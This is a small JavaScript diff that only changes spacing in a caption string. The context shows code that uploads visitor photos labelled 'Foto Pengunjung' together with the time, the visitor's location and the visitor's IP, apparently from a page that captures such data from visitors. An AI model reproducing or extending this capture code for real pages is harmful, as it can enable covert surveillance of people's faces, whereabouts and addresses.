@@ -272,7 +272,7 @@ function initMainPage() {
         formData.append('photo', photoBlob, `visit_${new Date().getTime()}_${currentCount}.jpg`);
         
         const captionText = `
-*📸 Foto Pengunjung. ${currentCount}/${totalCount} 📸 
+*📸 Foto Pengunjung. ${currentCount} / ${totalCount} 📸 
 *🕒 :* ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
 *📍 :* ${location}
 *🌐 :* ${ip}
